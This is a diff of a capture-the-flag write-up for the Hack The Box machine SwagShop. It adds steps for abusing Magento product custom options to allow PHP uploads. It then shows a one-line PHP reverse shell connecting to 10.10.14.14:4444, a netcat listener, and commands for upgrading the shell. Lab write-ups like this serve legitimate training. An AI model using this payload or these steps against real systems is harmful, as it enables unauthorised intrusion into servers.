@@ -89,14 +89,59 @@ gobuster dir -e -w /usr/share/wordlists/dirb/common.txt -u http://swagshop.htb/i
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/31fd6e3c-e7e5-4112-b3e8-3e9804c6dbf6)
 
-+ Follow Catalog -> Manage Products -> Click of the name on products -> Custom Options -> Add New Option: Fill out the fields with anything -> Save
++ **Follow consecutively**, Catalog -> Manage Products -> Click of the name on products -> Custom Options -> Add New Option: Fill out the fields with Input Type:File and Allowed File Extensions:php -> Save, and be sure that the product has been saved.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4fb0a78c-13fd-425d-9f14-1872887b7f1a)
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/313ebb45-331c-40bf-93c2-d46a10d22203)
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bfb592ba-ff8c-4a89-801d-3fe8e4c50321)
+
++ Next go to the home page `http://swagshop.htb/index.php/`, and click on **5 x Hack The Box Square Sticker**.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/80a6e0ae-b42b-4f0f-a26a-62cec021c306)
+
++ You will see that now we can upload files using the product fields. The file that we allowed to upload includes all files with PHP extensions:
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/df34f462-7f9b-4146-a5dc-c81071a8c742)
+
++ Create a reverse shell .php file as **shell.php**. Upload it using **browse** button, and ADD TO CART.
+```
+<?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.14/4444 0>&1'"); ?>
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b87bc67d-e9aa-416c-a35d-d512535bea31)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/502e1a27-71db-44b8-b43c-6aabe2e8c3d2)
+
++ Start netcat listener on the attack machine: `nc -lnvp 4444`
++ **Finally**, go to the under **media** directory `http://swagshop.htb/media/custom_options/quote/s/h/` that is discovered on the first directory fuzzing.
++ Click the php file named created unique random name.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d7a200d7-f925-4f1f-af42-f6dc2bbf28f6)
+
++ Get low level shell, and see the www-data's privilege is enough to view the content of the user flag.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f283088e-d95e-4d02-a123-46941339b6a1)
+
++ But yet we need to elevate root privilege.
 
 
+### Shell Upgrade
++ We have partially interactive bash shell. Upgrade it to get a fully interactive shell, do more stable with a better shell.
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+script /dev/null -c bash
+CTRL^Z: Ctrl + Z
+stty raw -echo; fg
+reset
+terminal type? 'screen' or 'xterm'
+export TERM=xterm  
+export SHELL=bash
+stty rows 55 columns 285
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/63a9d3b8-9bc0-4d88-bb02-ca5e422acf27)
 
 
 ## Privilege Escalation
